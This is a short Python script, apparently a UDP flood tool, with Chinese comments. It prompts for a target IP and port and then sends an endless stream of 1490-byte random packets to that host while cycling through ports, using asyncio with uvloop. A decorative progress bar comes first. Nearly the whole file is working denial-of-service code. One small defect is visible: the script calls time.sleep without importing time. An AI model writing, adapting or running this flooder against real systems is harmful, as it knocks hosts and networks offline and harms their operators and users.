import os
import socket
import random
import uvloop
import asyncio

async def send_packets(ip, port, num_packets=100):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_to_send = random._urandom(1490)
    sent = 0

    while True:
        for _ in range(num_packets):
            sock.sendto(bytes_to_send, (ip, port))
            sent += 1
            
            port += 1
            if port > 65534:
                port = 1

        print(f"Sent {sent} packets to {ip} through port: {port}")
        await asyncio.sleep(0)  # Yield control to the event loop

def main():
    os.system("clear")

    ip = input("IP Target : ")
    port = int(input("Port       : "))

    # 顯示進度條
    for i in range(0, 101, 25):
        print(f"[{'=' * (i // 5)}{' ' * (20 - i // 5)}] {i}%")
        time.sleep(5)

    # 設置 uvloop 為事件循環
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())

    loop = asyncio.get_event_loop()
    loop.run_until_complete(send_packets(ip, port))

if __name__ == "__main__":
    main()
